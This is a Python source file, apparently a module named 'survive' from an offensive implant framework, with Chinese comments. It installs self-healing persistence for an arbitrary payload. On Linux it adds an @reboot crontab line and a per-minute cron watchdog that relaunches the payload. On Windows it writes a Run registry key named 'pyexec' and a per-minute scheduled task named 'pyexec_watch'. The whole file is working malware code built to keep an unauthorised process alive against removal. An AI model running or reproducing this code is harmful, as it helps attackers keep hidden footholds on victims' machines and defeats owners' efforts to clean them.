"""
@module: survive
@desc: 多路径备份自愈（17）：主持久化 + 备份 watchdog 每分钟自动拉起
Linux:  主 cron @reboot + 备份 cron 每分钟 pgrep 检查拉起
Windows: 主 Run 键 + 备份 schtasks 每分钟检查拉起
"""
import os
import subprocess

MODULE = {
    "desc": "多路径备份自愈（主持久化 + watchdog 自动拉起）",
    "params": [("payload", "必填；拉起命令"),
               ("marker", "必填；进程特征（pgrep/tasklist 匹配）")],
}


def run(payload, marker):
    if os.name == "nt":
        return _windows(payload, marker)
    return _linux(payload, marker)


def _linux(payload, marker):
    out = []
    try:
        cur = subprocess.check_output(["crontab", "-l"], text=True,
                                      stderr=subprocess.DEVNULL)
    except Exception:
        cur = ""
    main_line = f"@reboot {payload}"
    watch_line = (f"*/1 * * * * pgrep -f {marker} >/dev/null "
                  f"|| ({payload}) >/dev/null 2>&1")
    new = cur.rstrip() + "\n"
    if main_line not in cur:
        new += main_line + "\n"
        out.append(f"主路径 @reboot: {payload}")
    else:
        out.append("主路径已存在")
    if watch_line not in cur:
        new += watch_line + "\n"
        out.append(f"watchdog 每分钟: {marker}")
    else:
        out.append("watchdog 已存在")
    subprocess.run(["crontab", "-"], input=new, text=True, timeout=10)
    return "(cron 自愈已安装)\n" + "\n".join(f"  {x}" for x in out)


def _windows(payload, marker):
    out = []
    try:
        subprocess.run(
            ["reg", "add",
             r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
             "/v", "pyexec", "/d", payload, "/f"],
            timeout=10, capture_output=True)
        out.append("主路径 Run 键: pyexec")
    except Exception as e:
        out.append(f"Run 键失败: {e}")
    try:
        cmd = ("powershell -NoProfile -Command "
               f"\"if (-not (tasklist | Select-String '{marker}')) "
               f"{{ {payload} }}\"")
        subprocess.run(
            ["schtasks", "/create", "/tn", "pyexec_watch", "/tr", cmd,
             "/sc", "minute", "/mo", "1", "/f"],
            timeout=10, capture_output=True)
        out.append("watchdog 计划任务: pyexec_watch（每分钟）")
    except Exception as e:
        out.append(f"计划任务失败: {e}")
    return "(Windows 自愈已安装)\n" + "\n".join(f"  {x}" for x in out)
